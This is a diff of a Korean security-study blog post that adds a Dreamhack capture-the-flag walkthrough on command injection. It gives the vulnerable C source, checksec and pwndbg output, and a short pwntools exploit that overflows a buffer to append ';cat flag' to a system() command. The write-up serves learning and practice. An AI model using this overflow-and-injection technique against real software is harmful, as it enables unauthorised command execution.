@@ -1,6 +1,6 @@
 ---
 layout: post
-title: <System Hacking> 26. Out of Bound
+title: <System Hacking> 26. Out of Bound, Command Injection
 date: 2026-05-12 10:31:23 +0900
 category: System_Hacking
 comments: true
@@ -10,7 +10,7 @@ comments: true
 
 사실 OOB 취약점은 개념 자체는 단순해서 예전에 따로 포스팅을 안했었다. 그래도 복습의 차원에서, 개념보다는 예제 위주로 설명을 진행해보려고 한다.
 
-## OOB Example
+### OOB Example
 
 Dreamhack의 OOB 예제이다.
 
@@ -144,4 +144,117 @@ p.interactive()
 
 그동안 작성했던 익스플로잇 코드중에 가장 짧은 것 같다.
 
+## Command Injection
 
+이 개념도 정말 단순한 거고, 문제를 통해서 그때그때 어떤 아이디어로 명령어를 삽입할지 승부해야 되는 영역이라 예시 문제로 넘어가겠다.
+
+### Command Injection Example
+
+Dreamhack의 예제이다.
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+void init() {
+        setvbuf(stdin, 0, 2, 0);
+        setvbuf(stdout, 0, 2, 0);
+}
+
+int main()
+{
+
+        char cmd_ip[256] = "ifconfig";
+        int dummy;
+        char center_name[24];
+
+        init();
+
+        printf("Center name: ");
+        read(0, center_name, 100);
+
+
+        if( !strncmp(cmd_ip, "ifconfig", 8)) {
+                system(cmd_ip);
+        }
+
+        else {
+                printf("Something is wrong!\n");
+        }
+        exit(0);
+}
+```
+
+### Check Security
+
+우선, `checksec`을 통해 보호 기법을 확인하자.
+
+```bash
+$ checksec cmd_center
+[*] '/home/Study/Dreamhack/Solved_Prob/cmd_center'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+Canary만 적용되지 않은 상태. 다만 NX가 적용되어 있어서 Return to Shellcode같은 공격은 안될것같다.
+
+### Exploit Design
+
+우선 GDB를 통해 디버깅을 해보면,
+
+```sh
+pwndbg> disass
+Dump of assembler code for function main:
+...
+   0x0000555555400916 <+105>:   lea    rax,[rbp-0x130]
+   0x000055555540091d <+112>:   mov    edx,0x64
+   0x0000555555400922 <+117>:   mov    rsi,rax
+   0x0000555555400925 <+120>:   mov    edi,0x0
+   0x000055555540092a <+125>:   call   0x555555400720 <read@plt>
+   0x000055555540092f <+130>:   lea    rax,[rbp-0x110]
+   0x0000555555400936 <+137>:   mov    edx,0x8
+   0x000055555540093b <+142>:   lea    rsi,[rip+0xd0]        # 0x555555400a12
+   0x0000555555400942 <+149>:   mov    rdi,rax
+   0x0000555555400945 <+152>:   call   0x5555554006e0 <strncmp@plt>
+   0x000055555540094a <+157>:   test   eax,eax
+   0x000055555540094c <+159>:   jne    0x55555540095f <main+178>
+   0x000055555540094e <+161>:   lea    rax,[rbp-0x110]
+   0x0000555555400955 <+168>:   mov    rdi,rax
+   0x0000555555400958 <+171>:   call   0x555555400700 <system@plt>
+...
+```
+
+`read`를 통해 입력을 받되, `center_name` 배열을 한참 뛰어넘게 입력받을 수 있다. 따라서 BOF 공격이 가능한가? 라고도 생각할 수 있다. 하지만 여기서는 Return Address까지 도달하지는 못하므로, 다른 방법을 생각해봐야한다.
+
+<br/>
+
+`system`을 통해 항상 `system('/bin/sh')`만 다뤄와서 놓치기 쉬운데, 사실 **`system` 함수 자체는 쉘에서 명령어를 실행하는 함수**이기 때문에, 굳이 쉘을 딸 필요가 없이, 본 문제의 목적인 **Flag 읽기**만 달성하면 된다.
+
+<br/>
+
+따라서, 마침 `center_name[24]`의 여유공간도 있겠다, `strncmp`의 검증도 우회할 겸, 명령어의 병렬 실행을 통해 원하는 흐름으로 조작이 가능하다. 그래서 `ifconfig;cat flag`로 명령어를 살짝 조작할 수 있다.
+
+### 최종 코드
+
+최종 정답은 다음과 같다.
+
+```python
+from pwn import *
+
+p = process('./cmd_center')
+
+payload = b'A'*0x20
+payload += b'ifconfig;cat flag'
+
+p.sendafter('Center name: ', payload)
+
+p.interactive()
+```
+
+아이디어만 알면 그 어떤 페이로드보다도 짧고 간단하다.
